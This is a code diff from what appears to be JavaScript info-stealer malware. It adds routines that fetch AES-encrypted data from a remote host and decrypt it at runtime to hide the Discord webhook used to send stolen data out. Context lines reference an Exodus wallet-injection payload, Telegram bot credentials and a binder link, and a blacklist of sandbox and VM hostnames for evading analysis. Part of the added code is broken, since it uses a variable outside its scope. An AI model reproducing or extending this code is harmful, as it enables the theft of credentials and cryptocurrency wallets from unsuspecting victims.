@@ -27,7 +27,83 @@ const exodusInjectionUrl = "https://github.com/doenerium6969/wallet-injection/ra
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
 const chatId = 'YOURCHATID';
-const discordWebhookUrl = 'REMPLACE_ME';
+
+async function decryptText(encryptedBase64, ivBase64, keyBase64) {
+    const encryptedArray = base64ToArrayBuffer(encryptedBase64);
+    const iv = base64ToArrayBuffer(ivBase64);
+    const key = await importKey(keyBase64);
+    const decrypted = await crypto.subtle.decrypt(
+        {
+            name: "AES-GCM",
+            iv: iv,
+        },
+        key,
+        encryptedArray
+    );
+
+    const decoder = new TextDecoder();
+    const decryptedText = decoder.decode(decrypted);
+
+    return decryptedText;
+}
+
+function base64ToArrayBuffer(base64) {
+    const buffer = Buffer.from(base64, 'base64'); 
+    return buffer.buffer.slice(buffer.byteOffset, buffer.byteOffset + buffer.byteLength);
+}
+
+async function importKey(keyBase64) {
+    const rawKey = base64ToArrayBuffer(keyBase64);
+    return await crypto.subtle.importKey(
+        "raw",
+        rawKey,
+        {
+            name: "AES-GCM"
+        },
+        true,
+        ["encrypt", "decrypt"]
+    );
+}
+
+async function fetchData(tes23) {
+    try {
+        const response = await fetch(tes23);
+        const data = await response.text(); 
+        return data;
+    } catch (error) {
+       // console.error("Veri alınırken hata oluştu:", error);
+    }
+}
+
+async function fetchAndDecrypt() {
+    const basewebhookurl = 'REMPLACE-ME-OC';
+
+    const encryptedUrl = `${baseUrl}/jacob`;  // Şifreli metin URL'si
+    const ivUrl = `${baseUrl}/mayo`;          // IV URL'si
+    const keyUrl = `${baseUrl}/tenk`;         // Key URL'si
+
+    try {
+        const encryptedBase64 = await fetchData(encryptedUrl);
+        const ivBase64 = await fetchData(ivUrl);
+        const keyBase64 = await fetchData(keyUrl);
+
+        if (encryptedBase64 && ivBase64 && keyBase64) {
+            const discordWebhookUrl = await decryptText(encryptedBase64, ivBase64, keyBase64);
+            return discordWebhookUrl;
+        } else {
+          //  console.error("Gerekli veriler alınamadı.");
+        }
+    } catch (error) {
+        //console.error("Bir hata oluştu:", error);
+    }
+}
+
+fetchAndDecrypt().then((tes23) => {
+    if (tes23) {
+    }
+});
+
+const discordWebhookUrl = tes23;
 const discordWebhookUr1 = discordWebhookUrl;
 
 const blackListedHostname = ["BEE7370C-8C0C-4", "AppOnFly-VPS","tVaUeNrRraoKwa", "vboxuser", "fv-az269-80", "DESKTOP-Z7LUJHJ", "DESKTOP-0HHYPKQ", "DESKTOP-TUAHF5I",  "DESKTOP-NAKFFMT", "WIN-5E07COS9ALR", "B30F0242-1C6A-4", "DESKTOP-VRSQLAG", "Q9IATRKPRH", "XC64ZB", "DESKTOP-D019GDM", "DESKTOP-WI8CLET", "SERVER1", "LISA-PC", "JOHN-PC", "DESKTOP-B0T93D6", "DESKTOP-1PYKP29", "DESKTOP-1Y2433R", "WILEYPC", "WORK", "6C4E733F-C2D9-4", "RALPHS-PC", "DESKTOP-WG3MYJS", "DESKTOP-7XC6GEZ", "DESKTOP-5OV9S0O", "QarZhrdBpj", "ORELEEPC", "ARCHIBALDPC", "JULIA-PC", "d1bnJkfVlH", ]
